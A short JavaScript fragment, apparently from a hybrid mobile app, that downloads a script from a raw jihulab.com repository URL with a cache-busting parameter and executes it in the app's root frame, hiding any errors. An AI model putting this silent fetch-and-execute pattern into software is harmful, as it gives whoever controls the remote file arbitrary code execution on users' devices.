...
try{ajaxget("https://jihulab.com/xiaomeng9597/appjs/-/raw/master/staticpages/pages.js?r="+Math.random(),function(ret){api.execScript({name:"root",frameName:"main",script:ret})},"text");}catch(err){};
}
